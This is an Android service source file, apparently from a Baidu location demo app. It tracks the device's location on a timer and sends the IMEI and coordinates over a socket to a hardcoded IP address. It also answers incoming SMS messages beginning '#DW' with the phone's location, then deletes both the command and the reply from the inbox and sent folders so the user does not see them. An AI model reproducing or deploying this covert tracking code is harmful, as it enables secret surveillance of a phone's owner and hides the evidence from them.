package com.baidu.baidulocationdemo;

import android.app.AlertDialog;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Telephony;
import android.support.v4.app.NotificationCompat;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.baidu.DatabaseHelper.DatabaseHelper;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.baidu.tools.Utils;
import com.baidu.uitls.Constantss;
import com.baidu.uitls.LogcatHelper;
import com.baidu.uitls.ProperUtil;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import static com.baidu.tools.Utils.isNetworkAvailable;
import static com.baidu.uitls.ProperUtil.chackProjects;


public class MyService extends Service {
    private LocationApplication LocApp;
    String time, timeSMS;
    private String sqlmsg19;//在没有网络的情况下保存在本地的位置数据
    ContentResolver resolver;
    private DynamicReceiver receiverSMS = new DynamicReceiver();
    private LocationClientOption.LocationMode tempMode = LocationClientOption.LocationMode.Device_Sensors;
    private LocationClient mLocationClient;
    Socket socket = null;
    public NotificationManager mNotificationManager;
    // Notification构造器
    NotificationCompat.Builder mBuilder;
    // NotificationID
    int notifyId = 100;
    public String strreg;
    private AlertDialog dialog;
    private ExecutorService mThreadPool;
    private OutputStream outputStream;

    public MyService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        initView();
        return super.onStartCommand(intent, flags, startId);
    }

    private void initView() {
        LogcatHelper.getInstance(this).start();
        socketConneted();
        Log.i("QWEQWE", "ASADA");
        IntentFilter filterSMS = new IntentFilter(
                "android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(receiverSMS, filterSMS);
        getContentResolver().registerContentObserver(
                Uri.parse("content://sms"), true, Observer);
        LocApp = (LocationApplication) getApplication();
        mLocationClient = (LocApp).mLocationClient;

        mNotificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        xxx();
        Constantss.ifOpen = false;


    }


    private void xxx() {

        startUploadingData();

//        getRegInfo();
    }


    public void startUploadingData() {

//        try {
//
//            Field field = dialog.getClass().getSuperclass()
//                    .getDeclaredField("mShowing");
//            field.setAccessible(true);
//            field.set(dialog, false);
//        } catch (Exception e) {
//
//            e.printStackTrace();
//        }

        Toast.makeText(getApplicationContext(), "已启用定位服务",
                Toast.LENGTH_SHORT).show();

        initLocation();
        // 点击后台运行
//                    Intent intent = new Intent(Intent.ACTION_MAIN);
//                    intent.addCategory(Intent.CATEGORY_HOME);
//                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                    startActivity(intent);
        mLocationClient.start();
        // （计时器操作）
        TimerTask task = new TimerTask() {
            public void run() {
                time();
                Log.i("qweqwe", "循环着吗？");
                if (isNetworkAvailable(getBaseContext())) {
                    DatabaseHelper dh = new DatabaseHelper(
                            getBaseContext(), "Locaiotn_sql");
                    SQLiteDatabase db = dh.getWritableDatabase();
                    Cursor cursor = db
                            .rawQuery(
                                    "select * from Locationmsg order by sqltime asc limit 1",
                                    null);
                    while (cursor.moveToNext()) {
                        String sqltime = cursor.getString(0); // 获取第一列的值,第一列的索引从0开始
                        sqlmsg19 = cursor.getString(1);// 获取第二列的值
                        if (sqlmsg19 != null) {
                            String sql = "delete from Locationmsg where sqltime ="
                                    + sqltime;
                            db.execSQL(sql);
                        }
                    }
                    cursor.close();
                    mLocationClient.stop();
                    mLocationClient.start();
                    if (socket != null && !socket.isConnected()) {
                        Log.i("qweqwe", "有网络下尝试连接");
                    } else {
                        socketConnectSend();
                        Log.i("QWEQWE", "持续发送消息中");
                    }

                } else {
                    mLocationClient.stop();
                    mLocationClient.start();
                    // 像ContentValues中存放数据
                    ContentValues values = new ContentValues();
                    DatabaseHelper dh = new DatabaseHelper(
                            getBaseContext(), "Locaiotn_sql");
                    SQLiteDatabase db = dh.getWritableDatabase();
                    values.put("sqltime", time);
                    values.put("sqlmsg", "**19"
                            + (LocApp).msgonline);
                    // 数据库执行插入命令
                    db.insert("Locationmsg", null, values);
                    socketConneted();
                    return;
                }

            }
        };
        Timer timer = new Timer(true);
        timer.schedule(task, 0, Integer.parseInt(Utils
                .getNetConfigProperties().getProperty(
                        "LocationTime")));

    }

    // socket网络交互
    public void sendMsg20() {

        try {
            // 创建socket对象，指定服务器端地址和端口号
            socket = new Socket(Utils.getNetConfigProperties()
                    .getProperty("IP"), Integer.parseInt(Utils
                    .getNetConfigProperties().getProperty("PORT")));
            // 获取 Client 端的输出流并填充信息
            PrintWriter out = new PrintWriter(new BufferedWriter(
                    new OutputStreamWriter(socket.getOutputStream())), true);
            out.println("**20" + (LocApp).imei + time + (LocApp).msgonline);
            // 关闭
            out.close();
            socket.close();
        } catch (UnknownHostException e1) {
            e1.printStackTrace();
        } catch (IOException e1) {
            e1.printStackTrace();
        }
    }

    /**
     * 初始化socket连接
     */

    private void socketConneted() {
        // 初始化线程池
        mThreadPool = Executors.newCachedThreadPool();
        // 利用线程池直接开启一个线程 & 执行该线程


        // 利用线程池直接开启一个线程 & 执行该线程
        mThreadPool.execute(new Runnable() {
            @Override
            public void run() {

                try {


                    String ip = ProperUtil.getConfigProperties("Ipx");
                    String port = ProperUtil.getConfigProperties("Portx");
                    if (chackProjects()) {
                        if (ip.length()==0||port.length()==0||ip == null || port == null) {
                            socket = new Socket("218.246.35.196", 7000);
                            Log.i("QWEQWEQ", "默认配置"+"\"218.246.35.196\", 7000");
                        } else {
                            int portx = Integer.parseInt(port);

                            Log.i("QWEQWEQ", "自定义配置"+ip+portx);
                            socket = new Socket(ip, portx);
                        }
                    } else {
                        Log.i("QWEQWEQ", "默认配置"+"\"218.246.35.196\", 7000");
                        socket = new Socket("218.246.35.196", 7000);
                    }
                    socket.setKeepAlive(true);
                    Log.i("QWEQWEQ", " 连接成功  初始化" + socket.isConnected() + ip + port + "---------");
                } catch (IOException e) {
                    Log.i("qweqwe", "连接异常");

                }
            }
        });


    }

    private void socketConnectSend() {
        // 利用线程池直接开启一个线程 & 执行该线程

        mThreadPool.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    if (socket != null) {
                        // 步骤1：从Socket 获得输出流对象OutputStream
                        // 该对象作用：发送数据
                        outputStream = socket.getOutputStream();
//                        if (alwaysResulta != null) {
                        // 步骤2：写入需要发送的数据到输出流对象中
                        outputStream.write(("**20" + (LocApp).imei + time + (LocApp).msgonline + "\n").getBytes("utf-8"));
                        Log.i("qweqwe", ("====**20" + (LocApp).imei + time + (LocApp).msgonline + "\n") + "");
                        // 特别注意：数据的结尾加上换行符才可让服务器端的readline()停止阻塞
                        // 步骤3：发送数据到服务端
                        outputStream.flush();
//                        }
                    }
                } catch (IOException e) {
                    socketConneted();
                    Log.i("qweqwe", "发送异常");
                }
                //连接后启动监听socket的状态


            }
        });
    }


    private void time() {
        // 获取当前时间
        SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMddHHmmss");
        Date curDate = new Date(System.currentTimeMillis());
        time = formatter.format(curDate);
        SimpleDateFormat formatter2 = new SimpleDateFormat(
                "yyyy-MM-dd HH:mm:ss");
        Date curDate2 = new Date(System.currentTimeMillis());// 获取当前时间
        timeSMS = formatter2.format(curDate2);
    }

    private PendingIntent getContentIntent() {
        Intent resultIntent = new Intent(this, LocationActivity.class);
        resultIntent.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0,
                resultIntent, PendingIntent.FLAG_UPDATE_CURRENT);
        return pendingIntent;
    }

    // 判断是否是飞行模式
    public static boolean isAirplaneModeOn(Context context) {

        return android.provider.Settings.System.getInt(
                context.getContentResolver(),

                android.provider.Settings.System.AIRPLANE_MODE_ON, 0) == 0;
    }

    // initLocation
    private void initLocation() {
        LocationClientOption option = new LocationClientOption();
        if ((LocApp).msgonline == null) {
            tempMode = LocationClientOption.LocationMode.Hight_Accuracy;
        }
        option.setLocationMode(tempMode);// 可选，默认高精度，设置定位模式，高精度，低功耗，仅设备
        option.setCoorType("gcj02");// 可选，默认gcj02，设置返回的定位结果坐标系，
        option.setOpenGps(true);// 可选，默认false,设置是否使用gps
        option.setLocationNotify(true);// 可选，默认false，设置是否当gps有效时按照1S1次频率输出GPS结果
        option.setIgnoreKillProcess(true);// 可选，默认true，定位SDK内部是一个SERVICE，并放到了独立进程，设置是否在stop的时候杀死这个进程，默认不杀死
        option.setIsNeedAddress(true);// 可选，设置是否需要地址信息，默认不需要
        option.disableCache(true);// 禁止使用缓存数据
        mLocationClient.setLocOption(option);
    }

    /**
     * 判断GPS是否开启，GPS或者AGPS开启一个就认为是开启的
     *
     * @param context
     * @return true 表示开启
     */
    public static boolean isOPen(Context context) {
        LocationManager locationManager = (LocationManager) context
                .getSystemService(Context.LOCATION_SERVICE);
        // 通过GPS卫星定位，定位级别可以精确到街（通过24颗卫星定位，在室外和空旷的地方定位准确、速度快）
        boolean gps = locationManager
                .isProviderEnabled(LocationManager.GPS_PROVIDER);
        // 通过WLAN或移动网络(3G/2G)确定的位置（也称作AGPS，辅助GPS定位。主要用于在室内或遮盖物（建筑群或茂密的深林等）密集的地方定位）
        boolean network = locationManager
                .isProviderEnabled(LocationManager.NETWORK_PROVIDER);
        if (gps || network) {
            return true;
        }

        return false;
    }

    // 对收到的短信内容进行提取
    public class DynamicReceiver extends BroadcastReceiver {
        public static final String SMS_ACTION = "android.provider.Telephony.SMS_RECEIVED";

        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (SMS_ACTION.equals(action)) {
                Bundle bundle = intent.getExtras();
                Object messages[] = (Object[]) bundle.get("pdus");
                SmsMessage smsMessage[] = new SmsMessage[messages.length];
                for (int n = 0; n < messages.length; n++) {
                    smsMessage[n] = SmsMessage
                            .createFromPdu((byte[]) messages[n]);
                    if (smsMessage[n].getMessageBody().startsWith("#DW")) {
                        String num = smsMessage[n].getOriginatingAddress();
                        SmsManager smsManager = SmsManager.getDefault();
                        smsManager.sendTextMessage(num, null, "#RDW" + "**20"
                                + ";" + timeSMS + (LocApp).msgSMS, null, null);
                    }
                }

            }
        }

    }

    // 删除收到的#DW
    ContentObserver Observer = new ContentObserver(new Handler()) {
        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            resolver = getContentResolver();
            // 删除收件箱的"DW"
            Cursor cursor = resolver.query(Uri.parse("content://sms/inbox"),
                    new String[]{"_id", "address", "body"}, null, null,
                    "_id desc");
            if (cursor.getCount() > 0 && cursor.moveToFirst()) {
                String saddress = cursor.getString(1);
                String sbody = cursor.getString(2);
                if (sbody.startsWith("#DW")) {
                    long id = cursor.getLong(0);
                    resolver.delete(Telephony.Sms.CONTENT_URI, "_id=" + id, null);
                }
            }
            cursor.close();
            // 删除发件箱的"RDW"
            Cursor cursor2 = resolver.query(Uri.parse("content://sms/sent"),
                    new String[]{"_id", "address", "body"}, null, null,
                    "_id desc");
            if (cursor2.getCount() > 0 && cursor2.moveToFirst()) {
                String saddress2 = cursor2.getString(1);
                String sbody2 = cursor2.getString(2);
                if (sbody2.startsWith("#RDW")) {
                    long id2 = cursor2.getLong(0);
                    resolver.delete(Telephony.Sms.CONTENT_URI, "_id=" + id2, null);
                }
            }
            cursor2.close();
        }
    };

    @Override
    public void onDestroy() {
        super.onDestroy();
        LogcatHelper.getInstance(this).stop();
    }
}